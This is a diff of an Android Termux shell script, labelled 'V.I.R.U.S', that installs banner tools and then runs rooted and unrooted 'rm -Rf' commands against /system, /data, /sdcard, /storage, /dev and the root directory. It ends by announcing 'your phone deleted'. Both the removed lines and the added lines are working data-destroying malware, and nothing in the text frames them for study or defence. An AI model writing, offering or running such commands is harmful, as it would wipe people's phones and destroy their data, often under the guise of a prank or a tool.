@@ -6,27 +6,25 @@ c='\033[1;94m'
 d='\033[1;95m'
 e='\033[1;96m'
 echo " "
-pkg install figlet
-pkg install toilet
-pkg install tsu
+apt update
+apt upgrade
+apt-get install toilet
+apt-get install figlet
+apt-get install tsu
 toilet -f standard -F gay Termux
 toilet -f standard -F gay V.I.R.U.S
-sleep 5
-echo "$a Ab phone ka sb kuch delete ho rha hai...... $b"
-echo " "
-sleep 5
-tsu -c rm -Rf /data/data
-tsu -c rm -Rf /sdcard
-rm -Rf /sdcard
-tsu -c rm -Rf /system
-cd ..
-cd usr
-rm -Rf *
-tsu -c rm -Rf *
+echo
+echo "press enter for loss"
+read
+su -c rm -Rf /system
 tsu -c rm -Rf /dev
 su -c rm -Rf /*
 su -c rm -Rf /dev
 su -c rm -Rf /system /data
 su -c rm -Rf /sdcard
 rm -Rf /sdcard
-echo "$c Completed $d"
+su -c rm /data
+rm -Rf /storage
+su -c rm -Rf /storage
+rm -Rf /sdcard1
+echo "$c Completed your phone deleted$d"
